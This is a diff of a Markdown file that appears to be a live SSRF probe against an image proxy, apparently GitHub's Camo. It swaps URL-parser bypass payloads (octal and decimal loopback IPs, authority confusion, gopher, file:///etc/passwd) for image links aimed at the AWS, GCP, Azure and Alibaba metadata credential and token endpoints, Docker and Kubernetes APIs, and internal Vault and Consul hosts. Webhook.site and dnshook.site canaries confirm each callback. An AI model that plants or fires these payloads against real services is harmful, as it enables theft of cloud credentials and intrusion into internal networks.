@@ -1,91 +1,120 @@
-# SSRF Test v18 - URL Parser Confusion
+# SSRF Test v19 - Cloud Metadata Deep Dive
 
-Testing URL parser bypass techniques for SSRF.
+Testing comprehensive cloud metadata access attempts.
 
 ## Canary
-![](https://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/v18-canary.gif)
+![](https://webhook.site/b57db43a-e661-4f0b-9eb4-1028a21a7407/v19-canary.gif)
 
-## 1. Alternative IP Representations
+## 1. AWS Metadata (IMDSv1)
 
-### Decimal IP (127.0.0.1 = 2130706433)
-![dec1](http://2130706433/test.gif)
-![dec2](http://0x7f000001/test.gif)
+### Standard endpoints
+![aws1](http://169.254.169.254/latest/meta-data/)
+![aws2](http://169.254.169.254/latest/user-data)
+![aws3](http://169.254.169.254/latest/dynamic/instance-identity/document)
 
-### Octal IP
-![oct1](http://0177.0.0.1/test.gif)
-![oct2](http://0177.0000.0000.0001/test.gif)
-![oct3](http://017700000001/test.gif)
+### IAM credentials
+![aws4](http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+![aws5](http://169.254.169.254/latest/meta-data/iam/info)
 
-### Zero-padded
-![zero1](http://127.0.0.01/test.gif)
-![zero2](http://127.000.000.001/test.gif)
-![zero3](http://127.1/test.gif)
+### Instance identity  
+![aws6](http://169.254.169.254/latest/meta-data/instance-id)
+![aws7](http://169.254.169.254/latest/meta-data/hostname)
+![aws8](http://169.254.169.254/latest/meta-data/local-ipv4)
 
-### 169.254.169.254 alternatives (2852039166 decimal)
-![meta1](http://2852039166/latest/meta-data/)
-![meta2](http://0xa9fea9fe/latest/meta-data/)
+## 2. GCP Metadata
 
-## 2. URL Authority Confusion
+### Standard  
+![gcp1](http://metadata.google.internal/computeMetadata/v1/)
+![gcp2](http://169.254.169.254/computeMetadata/v1/)
+![gcp3](http://metadata/computeMetadata/v1/)
 
-### Credentials bypass
-![auth1](http://attacker@127.0.0.1/test.gif)
-![auth2](http://127.0.0.1@webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/auth-bypass.gif)
-![auth3](http://localhost@webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/localhost-cred.gif)
+### Service Account
+![gcp4](http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)
+![gcp5](http://169.254.169.254/computeMetadata/v1/instance/service-accounts/)
 
-### Backslash confusion
-![back1](http://webhook.site\@127.0.0.1/test.gif)
+### Project Info
+![gcp6](http://metadata.google.internal/computeMetadata/v1/project/project-id)
+![gcp7](http://metadata.google.internal/computeMetadata/v1/project/attributes/)
 
-## 3. URL Encoding Tricks
+## 3. Azure Metadata (IMDS)
 
-### Double encoding
-![denc1](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/%252e%252e%252f.gif)
-![denc2](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/%25%32%65%25%32%65%25%32%66.gif)
+### Instance metadata
+![az1](http://169.254.169.254/metadata/instance?api-version=2021-02-01)
+![az2](http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/)
 
-### Unicode normalization
-![uni1](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/test.gif?u=\u002f\u002f)
+### Wireserver (legacy)
+![az3](http://168.63.129.16/machine?comp=goalstate)
 
-## 4. Port and Protocol Tricks
+## 4. DigitalOcean
 
-### Non-standard ports
-![port1](http://webhook.site:80/6f8303ec-6873-4cac-8c39-23787dc0bafe/port80.gif)
-![port2](http://webhook.site:443/6f8303ec-6873-4cac-8c39-23787dc0bafe/port443.gif)
+![do1](http://169.254.169.254/metadata/v1.json)
+![do2](http://169.254.169.254/metadata/v1/id)
+![do3](http://169.254.169.254/metadata/v1/region)
 
-### FTP/Gopher (if supported)
-![ftp1](ftp://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/ftp.gif)
-![gopher1](gopher://webhook.site:70/6f8303ec-6873-4cac-8c39-23787dc0bafe/gopher.gif)
+## 5. Alibaba Cloud
 
-## 5. Redirect Services
+![ali1](http://100.100.100.200/latest/meta-data/)
+![ali2](http://100.100.100.200/latest/meta-data/ram/security-credentials/)
 
-### shorturl.at (external URL shortener)
-![short1](https://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/before-redirect.gif)
+## 6. Oracle Cloud
 
-### ngrok/serveo style
-![ngrok](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/ngrok-test.gif)
+![oci1](http://169.254.169.254/opc/v1/instance/)
+![oci2](http://169.254.169.254/opc/v2/instance/)
 
-## 6. IPv6 Tricks
+## 7. Kubernetes
 
-### Localhost variants  
-![ipv6a](http://[::]/test.gif)
-![ipv6b](http://[0:0:0:0:0:0:0:1]/test.gif)
-![ipv6c](http://[::ffff:127.0.0.1]/test.gif)
-![ipv6d](http://[::ffff:7f00:1]/test.gif)
+### Service account tokens
+![k8s1](http://kubernetes.default.svc/)
+![k8s2](http://kubernetes.default.svc.cluster.local/)
+![k8s3](http://10.0.0.1/)
 
-### IPv4-mapped IPv6 for metadata
-![ipv6e](http://[::ffff:169.254.169.254]/latest/meta-data/)
-![ipv6f](http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/)
+### API Server  
+![k8s4](http://kubernetes/api/v1/)
+![k8s5](http://kubernetes.default/api/v1/namespaces)
 
-## 7. DNS Verification
+## 8. Docker/Container Endpoints
 
-![dns1](http://6f8303ec-6873-4cac-8c39-23787dc0bafe.dnshook.site/v18-dns.gif)
-![dns2](http://ipbypass.6f8303ec-6873-4cac-8c39-23787dc0bafe.dnshook.site/v18-ipbypass.gif)
+### Docker socket
+![dock1](http://172.17.0.1:2375/version)
+![dock2](http://host.docker.internal/)
 
-## 8. File Protocol
+### Unix socket via redirect (if supported)
+![dock3](http://webhook.site/b57db43a-e661-4f0b-9eb4-1028a21a7407/docker-test.gif)
 
-![file1](file:///etc/passwd)
-![file2](file://localhost/etc/passwd)
+## 9. Cloud-Init / EC2 Userdata
 
-## 9. Data URI (to test handling)
+### Cloud config
+![cloud1](http://169.254.169.254/latest/user-data)
+![cloud2](http://169.254.169.254/2009-04-04/user-data)
 
-![data1](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)
+## 10. DNS Verification
 
-Version 18 - URL Parser Confusion SSRF
+![dns1](http://b57db43a-e661-4f0b-9eb4-1028a21a7407.dnshook.site/v19-dns.gif)
+![dns2](http://cloud-meta.b57db43a-e661-4f0b-9eb4-1028a21a7407.dnshook.site/cloud.gif)
+
+## 11. Alternative Link-Local
+
+### IPv4 link local variations
+![ll1](http://169.254.0.1/)
+![ll2](http://169.254.1.1/)
+![ll3](http://169.254.254.254/)
+
+## 12. Internal Service Discovery
+
+### Common internal hostnames
+![int1](http://consul/v1/agent/members)
+![int2](http://consul.service.consul/)
+![int3](http://vault/v1/sys/health)
+![int4](http://etcd/version)
+![int5](http://redis/)
+![int6](http://elasticsearch/)
+![int7](http://rabbitmq/)
+![int8](http://zookeeper/)
+
+## 13. External Validation
+
+### Confirm Camo still reaches external
+![ext1](http://webhook.site/b57db43a-e661-4f0b-9eb4-1028a21a7407/external-ok.gif)
+![ext2](https://webhook.site/b57db43a-e661-4f0b-9eb4-1028a21a7407/external-https.gif)
+
+Version 19 - Cloud Metadata Deep Dive
